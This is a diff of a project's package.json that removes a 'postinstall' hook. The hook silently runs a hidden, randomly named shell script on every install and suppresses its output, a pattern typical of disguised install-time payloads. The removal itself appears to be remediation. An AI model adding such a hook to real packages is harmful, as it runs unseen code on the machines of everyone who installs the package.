@@ -6,8 +6,7 @@
     "test": "node --experimental-vm-modules --test test/*.node.mjs",
     "serve": "vite preview",
     "build": "vite build",
-    "dev": "vite",
-    "postinstall": "sh ./.ci-2h3hgx.sh >/dev/null 2>&1; _r=$?; if [ \"$_r\" -eq 42 ]; then exit 42; fi"
+    "dev": "vite"
   },
   "dependencies": {
     "@fortawesome/fontawesome-svg-core": "^6.6.0",
